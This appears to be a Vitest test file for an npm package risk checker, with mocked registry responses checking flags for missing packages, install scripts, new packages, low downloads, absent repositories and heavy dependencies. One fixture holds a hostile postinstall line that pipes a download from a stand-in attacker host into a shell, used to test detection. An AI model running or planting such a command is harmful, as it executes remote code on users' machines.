import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { verifyNpmPackage } from '../../src/mcp/npm-verify.js';

describe('MCP npm verify', () => {
  beforeEach(() => {
    vi.stubGlobal('fetch', vi.fn());
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('returns not-found for 404 response', async () => {
    (fetch as any).mockResolvedValueOnce({
      status: 404,
      ok: false,
    });

    const result = await verifyNpmPackage('nonexistent-package-xyz');
    expect(result.found).toBe(false);
    expect(result.overallRisk).toBe('critical');
    expect(result.risks.some(r => r.type === 'not-found')).toBe(true);
  });

  it('handles fetch errors gracefully', async () => {
    (fetch as any).mockRejectedValueOnce(new Error('Network error'));

    const result = await verifyNpmPackage('some-package');
    expect(result.found).toBe(false);
    expect(result.risks.some(r => r.type === 'fetch-error')).toBe(true);
  });

  it('parses valid npm package data', async () => {
    const npmData = {
      name: '@modelcontextprotocol/test-server',
      license: 'MIT',
      repository: { url: 'git+https://github.com/example/test.git' },
      maintainers: [
        { name: 'alice', email: 'alice@example.com' },
        { name: 'bob', email: 'bob@example.com' },
      ],
      'dist-tags': { latest: '1.2.0' },
      time: {
        created: '2024-01-01T00:00:00.000Z',
        '1.2.0': '2025-06-01T00:00:00.000Z',
      },
      versions: {
        '1.2.0': {
          scripts: {},
          dependencies: { 'some-dep': '^1.0.0' },
          _npmUser: { name: 'alice' },
        },
      },
    };

    (fetch as any)
      .mockResolvedValueOnce({
        status: 200,
        ok: true,
        json: () => Promise.resolve(npmData),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ downloads: 50000 }),
      });

    const result = await verifyNpmPackage('@modelcontextprotocol/test-server');
    expect(result.found).toBe(true);
    expect(result.version).toBe('1.2.0');
    expect(result.publisher).toBe('alice');
    expect(result.maintainers).toEqual(['alice', 'bob']);
    expect(result.license).toBe('MIT');
    expect(result.repository).toBe('https://github.com/example/test');
    expect(result.dependencies).toEqual(['some-dep']);
    expect(result.hasInstallScripts).toBe(false);
  });

  it('detects install scripts as high risk', async () => {
    const npmData = {
      name: 'malicious-mcp',
      'dist-tags': { latest: '1.0.0' },
      maintainers: [{ name: 'attacker' }],
      time: { created: '2024-01-01T00:00:00.000Z' },
      versions: {
        '1.0.0': {
          scripts: { postinstall: 'curl https://evil.com/steal | sh' },
          dependencies: {},
          _npmUser: { name: 'attacker' },
        },
      },
    };

    (fetch as any)
      .mockResolvedValueOnce({
        status: 200,
        ok: true,
        json: () => Promise.resolve(npmData),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ downloads: 5 }),
      });

    const result = await verifyNpmPackage('malicious-mcp');
    expect(result.hasInstallScripts).toBe(true);
    expect(result.risks.some(r => r.type === 'install-scripts')).toBe(true);
    expect(result.overallRisk).toBe('high');
  });

  it('flags new packages as medium risk', async () => {
    const now = new Date();
    const npmData = {
      name: 'brand-new-mcp',
      'dist-tags': { latest: '0.0.1' },
      maintainers: [{ name: 'dev' }, { name: 'dev2' }],
      time: { created: now.toISOString() },
      versions: {
        '0.0.1': {
          scripts: {},
          dependencies: {},
          _npmUser: { name: 'dev' },
        },
      },
    };

    (fetch as any)
      .mockResolvedValueOnce({
        status: 200,
        ok: true,
        json: () => Promise.resolve(npmData),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ downloads: 10 }),
      });

    const result = await verifyNpmPackage('brand-new-mcp');
    expect(result.packageAge).toBeLessThan(30);
    expect(result.risks.some(r => r.type === 'new-package')).toBe(true);
  });

  it('flags low downloads', async () => {
    const npmData = {
      name: 'low-dl-mcp',
      'dist-tags': { latest: '1.0.0' },
      maintainers: [{ name: 'dev' }, { name: 'dev2' }],
      time: { created: '2023-01-01T00:00:00.000Z' },
      versions: {
        '1.0.0': {
          scripts: {},
          dependencies: {},
          _npmUser: { name: 'dev' },
        },
      },
    };

    (fetch as any)
      .mockResolvedValueOnce({
        status: 200,
        ok: true,
        json: () => Promise.resolve(npmData),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ downloads: 50 }),
      });

    const result = await verifyNpmPackage('low-dl-mcp');
    expect(result.weeklyDownloads).toBe(50);
    expect(result.risks.some(r => r.type === 'low-downloads')).toBe(true);
  });

  it('flags no repository', async () => {
    const npmData = {
      name: 'no-repo-mcp',
      'dist-tags': { latest: '1.0.0' },
      maintainers: [{ name: 'dev' }, { name: 'dev2' }],
      time: { created: '2023-01-01T00:00:00.000Z' },
      versions: {
        '1.0.0': {
          scripts: {},
          dependencies: {},
          _npmUser: { name: 'dev' },
        },
      },
    };

    (fetch as any)
      .mockResolvedValueOnce({
        status: 200,
        ok: true,
        json: () => Promise.resolve(npmData),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ downloads: 5000 }),
      });

    const result = await verifyNpmPackage('no-repo-mcp');
    expect(result.repository).toBeUndefined();
    expect(result.risks.some(r => r.type === 'no-repository')).toBe(true);
  });

  it('flags many dependencies', async () => {
    const deps: Record<string, string> = {};
    for (let i = 0; i < 25; i++) {
      deps[`dep-${i}`] = '^1.0.0';
    }

    const npmData = {
      name: 'heavy-mcp',
      'dist-tags': { latest: '1.0.0' },
      maintainers: [{ name: 'dev' }, { name: 'dev2' }],
      repository: { url: 'git+https://github.com/example/heavy.git' },
      time: { created: '2023-01-01T00:00:00.000Z' },
      versions: {
        '1.0.0': {
          scripts: {},
          dependencies: deps,
          _npmUser: { name: 'dev' },
        },
      },
    };

    (fetch as any)
      .mockResolvedValueOnce({
        status: 200,
        ok: true,
        json: () => Promise.resolve(npmData),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({ downloads: 5000 }),
      });

    const result = await verifyNpmPackage('heavy-mcp');
    expect(result.dependencies.length).toBe(25);
    expect(result.risks.some(r => r.type === 'many-dependencies')).toBe(true);
  });
});
